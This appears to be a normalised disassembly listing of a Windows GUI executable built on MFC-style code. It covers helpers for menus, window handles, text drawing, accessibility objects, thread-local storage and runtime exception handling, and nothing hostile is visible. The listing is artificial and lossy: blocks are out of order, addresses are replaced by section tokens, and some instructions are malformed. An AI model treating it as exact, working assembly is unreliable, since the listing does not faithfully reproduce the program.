mov eax [ ebp + 0x8 ]
mov [ eax ] edx
dec [ ecx + 0xc ]
mov [ ecx + 0x10 ] eax
jne r-xdata
pop ebp
retn 0x4
call sub_40c349
sub_40c502
mov eax r--data
retn
sub_40c614
mov eax rw-data
retn
sub_40c659
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_415093
pop ecx
pop ebp
retn 0x4
sub_40c69d
mov eax ecx
retn
sub_40c6a0
mov eax ecx
mov [ eax ] r--data
xor ecx ecx
mov [ eax + 0x10 ] 0x2
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x14 ] cx
mov [ eax + 0x16 ] cx
mov [ eax + 0x4 ] eax
retn
sub_40c6c3
xor edx edx
lea eax [ ecx + 0x10 ]
inc edx
[ eax ] edx
lea eax [ ecx + 0x4 ]
retn
sub_40c74b
call sub_40bc5d
mov eax [ eax + 0x4 ]
retn
sub_40c77e
mov edi edi
push ebp
mov ebp esp
call sub_40bc5d
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
pop ebp
jmp sub_40c754
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x6c ]
sub_40c79b
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x20 ]
call [ SendMessageW@IAT ]
pop ebp
retn 0xc
sub_40c8e7
cmp [ ecx + 0x4 ] 0x0
je r-xdata
retn
push [ ecx ]
push 0x0
call sub_40af3e
sub_40c8f7
cmp [ ecx + 0x8 ] 0x0
je r-xdata
add ecx 0x4
push ecx
call [ InterlockedIncrement@IAT ]
retn
mov eax [ ecx + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
retn
sub_40c968
cmp [ ecx + 0x8 ] 0x0
je r-xdata
jmp sub_40c912
mov eax [ ecx + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
retn
sub_40cb35
push 0x410
mov eax sub_425b9e
call sub_415c5f
mov eax ecx
and [ ebp - 0x4 ] 0x0
add eax 0x50
push eax
call sub_412d07
call sub_415cbb
retn
sub_40cbfa
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4161fb
push eax
call sub_40a828
add esp 0x10
pop ebp
retn
sub_40cc4b
test ecx ecx
je r-xdata
retn
push esi
mov esi [ ecx ]
push ecx
call sub_40a5fb
pop ecx
mov ecx esi
test esi esi
jne r-xdata
pop esi
sub_40cc61
mov edi edi
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
pop ebp
retn 0x8
sub_40d28b
mov eax r--data
retn
sub_40d332
mov eax r-xdata
retn
sub_40d64c
xor eax eax
inc eax
retn 0x4
sub_40d652
mov eax 0x80029c4a
retn 0x8
sub_40d65a
mov eax r--data
retn
sub_40d660
mov eax r--data
retn
sub_40d666
mov eax r--data
retn
sub_40d66c
mov eax r--data
retn
sub_40d672
xor eax eax
retn 0x4
sub_40d677
mov eax r--data
retn
sub_40d6a3
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x4 ]
call [ CheckMenuItem@IAT ]
pop ebp
retn 0x8
sub_40d6bb
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x4 ]
call [ EnableMenuItem@IAT ]
pop ebp
retn 0x8
sub_40d6d3
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x4 ]
call [ ModifyMenuW@IAT ]
pop ebp
retn 0x10
sub_40d719
mov edi edi
push esi
mov esi ecx
lea ecx [ esi + 0x10 ]
mov eax [ ecx ]
test eax eax
je r-xdata
and [ esi + 0x1c ] 0x0
pop esi
retn
call [ eax + 0x1c ]
sub_40d730
call sub_40bc2a
mov eax [ eax + 0x4 ]
mov edx [ eax ]
push 0x1
mov ecx eax
call [ edx + 0x9c ]
retn
sub_40d745
call sub_40bc2a
mov eax [ eax + 0x4 ]
mov edx [ eax ]
push 0xffffffff
mov ecx eax
call [ edx + 0x9c ]
retn
sub_40db7f
push [ ebp + 0x8 ]
call sub_40a5b5
push 0x0
push 0x0
call sub_415cca
int3
sub_40e5c5
push [ ecx + 0x20 ]
call [ GetMenu@IAT ]
push eax
call sub_413320
retn
sub_40e5d5
cmp [ ecx + 0x20 ] 0x0
mov eax [ ecx ]
je r-xdata
jmp [ eax + 0x11c ]
jmp [ eax + 0x60 ]
sub_40e62f
lea eax [ ecx + 0x40 ]
retn
sub_40e74f
mov edi edi
push esi
mov esi ecx
call sub_40d67d
mov [ esi ] r--data
mov [ esi + 0x28 ] 0x1
mov eax esi
pop esi
retn
sub_40e76a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx + 0x28 ] eax
mov [ ecx + 0x18 ] 0x1
pop ebp
retn 0x4
sub_40e7b1
mov eax r--data
retn
sub_40e7b7
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_40e518
pop ebp
retn 0x18
sub_40e7d4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
jne r-xdata
mov [ eax ] 0x1
xor eax eax
mov eax 0x80004003
jmp r-xdata
pop ebp
retn 0x8
sub_40e7f3
mov eax 0x80004001
retn 0x10
sub_40e7fb
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_40a5fb
pop ecx
pop ebp
retn 0x8
sub_40e80d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
jne r-xdata
and [ eax ] 0x0
mov eax 0x80004001
mov eax 0x80004003
jmp r-xdata
pop ebp
retn 0x8
sub_40e82c
lea eax [ ecx + 0x28 ]
cmp [ eax ] 0x0
jne r-xdata
xor eax eax
push eax
push r--data
push 0xfffffffc
push [ ecx + 0x20 ]
call CreateStdAccessibleObject
test eax eax
jl r-xdata
retn
sub_40e84b
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x28 ]
push [ ebp + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x1c ]
pop ebp
retn 0x4
sub_40e860
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x28 ]
push [ ebp + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x20 ]
pop ebp
retn 0x4
sub_40e9c5
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x28 ]
push [ ebp + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x48 ]
pop ebp
retn 0x4
sub_40e9da
mov edi edi
push ebp
mov ebp esp
mov eax [ ecx + 0x28 ]
push [ ebp + 0x8 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x4c ]
pop ebp
retn 0x4
sub_40ea8f
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
mov eax [ ecx + 0x28 ]
push [ ebp + 0xc ]
mov ecx [ eax ]
push [ ebp + 0x8 ]
push eax
call [ ecx + 0x60 ]
pop ebp
retn 0xc
sub_40eaf1
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx + 0x2c ] eax
xor eax eax
pop ebp
retn 0x4
sub_40eb02
xor eax eax
inc eax
retn
sub_40eb06
mov eax [ ecx + 0x3c ]
and eax 0x10
retn
sub_40eb0d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
and [ eax ] 0x0
xor eax eax
inc eax
pop ebp
retn 0x4
call sub_40a7dd
sub_40eb28
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
jne r-xdata
and [ eax ] 0x0
xor eax eax
inc eax
pop ebp
retn 0x10
call sub_40a7dd
sub_40eb43
mov eax r--data
retn
sub_40eb49
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push r--data
push eax
call [ ecx ]
pop ebp
retn 0x8
sub_40ee59
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ ecx + 0x4 ]
call [ GetMenuItemID@IAT ]
pop ebp
retn 0x4
sub_40ee6e
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ ecx + 0x4 ]
call [ GetSubMenu@IAT ]
push eax
call sub_413320
pop ebp
retn 0x4
sub_40ee89
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ ecx + 0x20 ]
call [ GetWindowRect@IAT ]
pop ebp
retn 0x4
sub_40ee9e
push 0x0
push [ ecx + 0x20 ]
call [ EnableWindow@IAT ]
retn
sub_40eeaa
push 0x1
push [ ecx + 0x20 ]
call [ EnableWindow@IAT ]
retn
sub_40eeb6
mov edi edi
push esi
mov esi ecx
call sub_40bc2a
mov ecx [ eax + 0x4 ]
call sub_40d730
mov eax esi
pop esi
retn
sub_40ef1c
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
add ecx 0x1c
call sub_40c596
mov ecx [ ebp + 0xc ]
mov [ eax ] ecx
pop ebp
retn 0x8
sub_40ef7a
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_40ee89
mov ecx [ ebp + 0x8 ]
call sub_412b76
mov ecx [ ebp + 0x10 ]
mov [ ecx ] eax
pop ebp
retn 0xc
sub_40ef9b
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push eax
push [ ecx + 0x20 ]
call [ SetMenu@IAT ]
pop ebp
retn 0x4
mov eax [ eax + 0x4 ]
sub_40f115
mov [ ecx ] r--data
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
retn
push ecx
call [ FreeLibrary@IAT ]
sub_40fbae
mov eax [ ecx ]
test eax eax
je r-xdata
retn
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_40fdd2
push 0x4
mov eax sub_425ce5
call sub_415bc0
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
call sub_415c98
retn 0x4
call sub_40ef35
sub_40febf
cmp [ ebp - 0x20 ] 0x2
je r-xdata
retn
push [ ebp - 0x1c ]
push 0x0
call sub_40af3e
sub_40ffaa
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_40bc2a
mov eax [ eax + 0x78 ]
mov ecx [ eax ]
call sub_40feff
pop ebp
retn 0x4
j_sub_40ef00
jmp sub_40ef00
sub_410621
push 0xc
call sub_40a8fc
test eax eax
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
retn
sub_410636
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ ecx + 0x20 ]
call [ GetWindow@IAT ]
push eax
call sub_4100ae
pop ebp
retn 0x4
sub_41077b
mov eax [ ebp - 0x18 ]
add eax 0x58
push eax
push [ ebp - 0x14 ]
call sub_40c77e
cmp [ ebp - 0x14 ] 0x0
mov [ ebp + 0x18 ] eax
je r-xdata
mov eax r-xdata
retn
mov ecx [ ebp - 0x14 ]
call sub_40a6d5
sub_410f35
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
neg eax
sbb eax eax
and eax 0xffff3ef9
add eax 0x80010108
pop ebp
retn 0x18
sub_410f52
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8 ] ecx
xor eax eax
pop ebp
retn 0xc
sub_411027
mov eax [ ecx + 0x38 ]
test eax eax
jne r-xdata
push eax
call sub_4100ae
retn
push [ ecx + 0x20 ]
call [ GetParent@IAT ]
sub_411441
xor eax eax
retn 0x8
sub_411446
mov eax 0x80004001
retn 0x8
sub_41144e
cmp [ ecx + 0xc ] 0x0
jne r-xdata
mov eax [ ecx + 0xc ]
mov ecx [ eax ]
push 0x0
push eax
call [ ecx + 0xc ]
retn
xor eax eax
retn
sub_411536
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push r--data
push ecx
call sub_411493
pop ebp
retn 0x8
sub_411550
mov [ ecx ] r--data
mov [ ecx + 0x4 ] r--data
mov [ ecx + 0x10 ] r--data
mov [ ecx + 0x14 ] 0xc0000001
call sub_41144e
jmp sub_413d0b
sub_411575
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
inc [ eax + 0x14 ]
mov eax [ eax + 0x14 ]
pop ebp
retn 0x4
sub_4115aa
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_411536
pop ebp
retn 0xc
sub_4115e2
sub [ esp + 0x4 ] 0x10
jmp sub_411587
sub_4115ec
sub [ esp + 0x4 ] 0x4
jmp sub_4115aa
sub_4115f6
sub [ esp + 0x4 ] 0x10
jmp sub_411575
sub_411600
sub [ esp + 0x4 ] 0x10
jmp sub_4115aa
sub_41160a
sub [ esp + 0x4 ] 0x4
jmp sub_411587
sub_411614
sub [ esp + 0x4 ] 0x4
jmp sub_411575
sub_4124a2
mov ecx [ ebp - 0x20 ]
call sub_40a6d5
mov eax r-xdata
retn
sub_4124b7
cmp eax edi
je r-xdata
mov [ esi ] eax
mov eax [ ebp - 0x14 ]
call sub_415c98
retn 0x4
mov [ ebp - 0x14 ] edi
sub_4124cb
push 0x410
mov eax sub_425e1a
call sub_415c5f
and [ ebp - 0x4 ] 0x0
call sub_40bc2a
mov ecx [ eax + 0x4 ]
call sub_40d745
call sub_415cbb
retn
sub_41277a
mov eax r--data
retn
sub_4127fc
push 0x1
call sub_40aee8
push 0x0
push 0x0
call sub_415cca
int3
sub_412b68
mov edi edi
push ebp
mov ebp esp
mov ecx [ ecx + 0x4c ]
mov eax [ ecx ]
pop ebp
jmp [ eax + 0x58 ]
sub_412b76
cmp [ ecx + 0x50 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x50 ]
mov eax [ ecx ]
jmp [ eax + 0x78 ]
push 0xfffffff0
push [ ecx + 0x20 ]
call [ GetWindowLongW@IAT ]
retn
sub_412b90
cmp [ ecx + 0x50 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x50 ]
mov eax [ ecx ]
jmp [ eax + 0x7c ]
push 0xffffffec
push [ ecx + 0x20 ]
call [ GetWindowLongW@IAT ]
retn
sub_412baa
cmp [ ecx + 0x50 ] 0x0
jne r-xdata
mov ecx [ ecx + 0x50 ]
mov eax [ ecx ]
jmp [ eax + 0xa4 ]
push [ ecx + 0x20 ]
call [ IsWindowEnabled@IAT ]
retn
sub_412e2f
mov eax rw-data
retn
sub_412e35
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x8 ] ecx
retn
sub_412e4c
push [ ecx + 0x4 ]
mov [ ecx ] r--data
call sub_40a5fb
pop ecx
retn
sub_412fee
push 0x14
call sub_40a5cc
pop ecx
test eax eax
je r-xdata
xor eax eax
retn
mov ecx eax
jmp sub_412e35
sub_4131b9
mov edi edi
push ebp
mov ebp esp
push 0x1
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_413168
pop ebp
retn 0xc
sub_413201
mov edi edi
push esi
mov esi ecx
mov ecx [ esi + 0x8 ]
call sub_40cc4b
and [ esi + 0x8 ] 0x0
and [ esi + 0xc ] 0x0
pop esi
retn
j_sub_413201
jmp sub_413201
sub_41325f
mov eax r--data
retn
sub_413265
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
push 0x0
call [ eax + 0x4 ]
pop ebp
retn 0x4
sub_413278
push 0x8
call sub_40a5cc
pop ecx
test eax eax
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
and [ eax + 0x4 ] 0x0
retn
sub_413292
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn 0x4
and [ eax + 0x4 ] 0x0
mov [ eax ] r--data
sub_413320
mov edi edi
push ebp
mov ebp esp
push 0x1
call sub_4132ac
mov ecx eax
pop ebp
jmp sub_40dade
sub_413381
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
call sub_413355
push eax
call [ DestroyMenu@IAT ]
retn
xor eax eax
retn
sub_4133be
push 0x410
mov eax sub_425eae
call sub_415c5f
and [ ebp - 0x4 ] 0x0
mov [ ecx ] r--data
call sub_413b05
call sub_415cbb
retn
sub_4134a4
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
pop ebp
retn 0x4
sub_4134b3
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ ecx + 0x4 ] eax
pop ebp
retn 0x4
sub_4134c2
and [ ecx + 0x8 ] 0x0
retn
sub_4134c7
and [ ecx + 0x4 ] 0x0
retn
sub_4135d9
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ ecx + 0x4 ]
call [ GetClipBox@IAT ]
pop ebp
retn 0x4
sub_4135ee
mov eax r--data
retn
sub_4135f4
mov eax r--data
retn
sub_4135fa
mov eax r--data
retn
sub_413600
mov eax r--data
retn
sub_413606
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
retn
sub_41361a
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x4 ]
call [ PtVisible@IAT ]
pop ebp
retn 0x8
sub_413632
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ ecx + 0x4 ]
call [ RectVisible@IAT ]
pop ebp
retn 0x4
sub_413647
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x4 ]
call [ TextOutW@IAT ]
pop ebp
retn 0x10
sub_4136c4
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x4 ]
call [ DrawTextW@IAT ]
pop ebp
retn 0x10
sub_4136e2
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x4 ]
call [ DrawTextExW@IAT ]
pop ebp
retn 0x14
sub_413735
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ecx + 0x4 ]
call [ Escape@IAT ]
pop ebp
retn 0x10
sub_413906
push 0x8
call sub_40a5cc
pop ecx
test eax eax
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
and [ eax + 0x4 ] 0x0
retn
sub_413941
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn 0x4
and [ eax + 0x4 ] 0x0
mov [ eax ] r--data
sub_4139f1
mov edi edi
push ebp
mov ebp esp
push 0x1
call sub_41397d
mov ecx eax
pop ebp
jmp sub_40dade
sub_413a38
cmp [ ecx + 0x4 ] 0x0
mov [ ecx ] r--data
je r-xdata
retn
call sub_413a05
push eax
call [ DeleteDC@IAT ]
sub_413ac5
mov edi edi
push ebp
mov ebp esp
push 0x1
call sub_413a51
mov ecx eax
pop ebp
jmp sub_40dade
sub_413b05
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
call sub_413ad9
push eax
call [ DeleteObject@IAT ]
retn
xor eax eax
retn
sub_413c8b
call sub_40bc2a
xor ecx ecx
cmp [ eax + 0x2c ] ecx
sete cl
mov eax ecx
retn
sub_413c9b
call sub_40bc2a
add eax 0x2c
push eax
call [ InterlockedIncrement@IAT ]
retn
sub_413cab
mov edi edi
push ebp
mov ebp esp
call sub_40bc2a
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x30 ] ecx
pop ebp
retn 0x4
sub_413d7a
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x8 ] ecx
retn
sub_413f6c
mov [ ecx ] r--data
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
retn
push ecx
call sub_40a5fb
pop ecx
sub_4140c9
mov ecx [ ebp - 0x1c ]
test ecx ecx
je r-xdata
and [ ebp - 0x14 ] 0x0
mov eax r-xdata
retn
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_4140e7
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x3c ] esi
test eax eax
je r-xdata
call sub_415c98
retn 0x4
mov ecx [ ebp - 0x14 ]
mov [ eax ] ecx
sub_414700
mov ecx [ ebp - 0x14 ]
xor ebx ebx
cmp ecx ebx
je r-xdata
push ebx
push ebx
call sub_415cca
int3
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
sub_41471e
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x8 ] ecx
retn
sub_414735
push [ ecx + 0x4 ]
mov [ ecx ] r--data
call sub_40a5fb
pop ecx
retn
sub_414932
mov eax rw-data
retn
sub_414938
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_414522
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x8
sub_41494f
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push 0x0
call sub_4145be
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x8
sub_41496a
mov eax ecx
xor ecx ecx
mov [ eax ] r--data
mov [ eax + 0x4 ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x8 ] ecx
retn
sub_414981
push [ ecx + 0x4 ]
mov [ ecx ] r--data
call sub_40a5fb
pop ecx
retn
sub_4149fc
push 0x14
call sub_40a5cc
pop ecx
test eax eax
je r-xdata
xor eax eax
retn
mov ecx eax
jmp sub_41496a
sub_414edd
mov edi edi
push ecx
mov [ ecx ] r--data
call sub_418cb3
pop ecx
retn
sub_414f8b
mov eax ecx
and [ eax + 0x4 ] 0x0
and [ eax + 0x8 ] 0x0
mov [ eax ] r--data
retn
sub_41504f
cmp [ ecx + 0x8 ] 0x0
mov [ ecx ] r--data
je r-xdata
retn
push [ ecx + 0x4 ]
call sub_415093
pop ecx
sub_415065
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
retn
mov eax r--data
sub_4150e9
push 0x4
call sub_418f7d
pop ecx
retn
sub_415167
push 0x4
call sub_418f7d
pop ecx
retn
sub_41527a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_4153d7
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_4153b1
add esp 0x14
retn
sub_4154a1
push 0xc
push r--data
call sub_415ff4
call sub_41a075
and [ ebp - 0x4 ] 0x0
push [ eax + 0x58 ]
call [ eax + 0x54 ]
push eax
call sub_415464
sub_4154d6
mov esp [ ebp - 0x18 ]
push [ ebp - 0x1c ]
call sub_418519
int3
sub_415752
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x24 ] ecx
push eax
push ecx
call sub_41a87e
pop ecx
pop ecx
retn
sub_415766
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_41853e
push eax
call sub_418519
sub_415780
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x20 ]
call sub_416039
retn
_start
call sub_41b217
jmp sub_41563e
sub_415c98
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_415cac
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_414a33
jmp sub_415c98
sub_415cbb
mov ecx [ ebp - 0x14 ]
xor ecx ebp
call sub_414a33
jmp sub_415c98
sub_415f34
call sub_418308
retn
sub_415f3a
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_415efe
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_416039
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_416439
push 0x4
call sub_418f7d
pop ecx
retn
sub_417be7
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
push sub_41c730
call sub_417b90
add esp 0x10
pop ebp
retn
sub_417d86
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_417cfb
add esp 0x14
pop ebp
retn
sub_417da3
mov eax sub_41ea0d
mov [ rw-data ] eax
mov [ rw-data ] sub_41e0f4
mov [ rw-data ] sub_41e0a8
mov [ rw-data ] sub_41e0e1
mov [ rw-data ] sub_41e04a
mov [ rw-data ] eax
mov [ rw-data ] sub_41e985
mov [ rw-data ] sub_41e066
mov [ rw-data ] sub_41dfc8
mov [ rw-data ] sub_41df55
retn
sub_417e03
mov edi edi
push ebp
mov ebp esp
call sub_417da3
call sub_41eaba
cmp [ ebp + 0x8 ] 0x0
mov [ rw-data ] eax
je r-xdata
fnclex
pop ebp
retn
call sub_41ea51
sub_418064
push 0x4
call sub_418f7d
pop ecx
retn
sub_418212
push 0x4
call sub_418f7d
pop ecx
retn
sub_4182e7
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_4182bc
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_4182ff
push 0x8
call sub_419057
pop ecx
retn
sub_418308
push 0x8
call sub_418f7d
pop ecx
retn
sub_4184ee
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_418f7d
pop ecx
sub_418503
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x0
push [ ebp + 0x8 ]
call sub_4183d7
add esp 0xc
pop ebp
retn
sub_418519
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_4183d7
add esp 0xc
pop ebp
retn
sub_41852f
push 0x1
push 0x0
push 0x0
call sub_4183d7
add esp 0xc
retn
sub_41853e
push 0x1
push 0x1
push 0x0
call sub_4183d7
add esp 0xc
retn
sub_41885b
push 0xc
push r--data
call sub_415ff4
and [ ebp - 0x4 ] 0x0
movapd xmm0 xmm1
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_416039
retn
sub_418878
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_41890d
call sub_4188ab
mov [ rw-data ] eax
xor eax eax
retn
sub_418bca
and [ rw-data ] 0x0
call sub_4188ab
mov [ rw-data ] eax
xor eax eax
retn
sub_418d1a
push 0xe
call sub_418f7d
pop ecx
retn
sub_418f7d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_41904e
push 0xa
call sub_418f7d
pop ecx
retn
sub_419d32
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_419d69
and [ rw-data ] 0x0
retn
sub_419de3
push 0x0
call sub_419d71
pop ecx
retn
sub_419e5e
call [ TlsAlloc@IAT ]
retn 0x4
sub_419e67
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ rw-data ]
call [ TlsGetValue@IAT ]
call eax
pop ebp
retn 0x4
sub_419e81
mov eax [ rw-data ]
retn
sub_419ebb
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ rw-data ]
call sub_419dec
pop ecx
call eax
pop ebp
retn 0x8
sub_419fea
push 0xd
call sub_418f7d
pop ecx
retn
sub_419ff3
push 0xc
call sub_418f7d
pop ecx
retn
sub_41a1a9
push 0xd
call sub_418f7d
pop ecx
retn
sub_41a1b5
push 0xc
call sub_418f7d
pop ecx
retn
sub_41a84b
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ecx ]
xor edx edx
cmp eax 0xc0000005
sete dl
mov eax edx
retn
